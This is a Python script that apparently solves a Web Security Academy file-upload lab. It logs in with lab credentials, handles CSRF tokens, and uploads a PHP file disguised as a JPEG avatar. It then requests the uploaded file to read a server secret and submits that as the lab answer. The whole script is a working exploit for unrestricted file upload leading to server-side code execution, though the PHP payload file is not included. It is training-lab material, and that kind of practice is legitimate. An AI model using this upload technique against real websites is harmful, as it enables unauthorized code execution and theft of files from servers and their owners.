import requests
from lxml import html
from rich.console import Console

console = Console()
session = requests.Session()

filename = "mali_file.php"

SERVER = "https://0a1b002303079b48b9dd34a7005800d7.web-security-academy.net/"
LOGIN = "login"
MY_ACCOUNT="my-account"
POST_AVATAR = "my-account/avatar"
FILE_ENDPOINT=f"files/avatars/{filename}"
SUBMIT_SOLUTION="submitSolution"


def get_csrf_token(page_url):
    """Fetch CSRF token from a given page."""
    response = session.get(page_url)
    tree = html.fromstring(response.content)
    csrf_token = tree.xpath("//input[@name='csrf']/@value")
    return csrf_token[0] if csrf_token else None


def login(username, password):
    """Log in to the application."""
    csrf = get_csrf_token(f"{SERVER}{LOGIN}")
    if not csrf:
        console.print("[red]CSRF token not found on login page[/red]")
        return False

    payload = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }

    response = session.post(f"{SERVER}{LOGIN}", data=payload)
    if response.status_code == 200:
        console.print("[green]Login successful[/green]")
        return True
    else:
        console.print("[red]Login failed[/red]")
        console.print(response.text)
        return False


def post_vuln_file():
    """Upload a malicious PHP file disguised as an image."""
    csrf = get_csrf_token(f"{SERVER}{MY_ACCOUNT}")
    if not csrf:
        console.print("[red]CSRF token not found on my-account page[/red]")
        return

    vuln_file = {
        "avatar": (f"{filename}", open("file_upload_vuln.php", "rb"), "image/jpeg"),
        "csrf": (None, csrf),  # Include CSRF token in the multipart form
        "user": (None, "wiener"),
    }

    response = session.post(
        f"{SERVER}{POST_AVATAR}",
        files=vuln_file,
    )

    if response.status_code == 200:
        console.print("[green]Malicious file uploaded successfully[/green]")
    else:
        console.print(f"[red]Failed to upload file[/red]: {response.status_code}")
        console.print(response.text)

    return response.status_code == 200


def retrieve_and_submit_solution():
    response = session.get(
        f"{SERVER}{FILE_ENDPOINT}",
    )
    
    console.print(f"[green]SECRET: {response.text} [/green]")

    body = {
        "answer": response.text.strip()
    }

    res = session.post(
        f"{SERVER}{SUBMIT_SOLUTION}", data=body
    )

    if res.status_code == 200:
        console.print("[green]Solution found![/green]")
    else:
        console.print(f"[red]Wrong solution[/red]: {res.status_code}\n{res.json}")
        console.print(res.text)

    return res.status_code == 200


if login("wiener", "peter"):
    with console.status("Uploading malicious file..."):
        if post_vuln_file():
            retrieve_and_submit_solution()
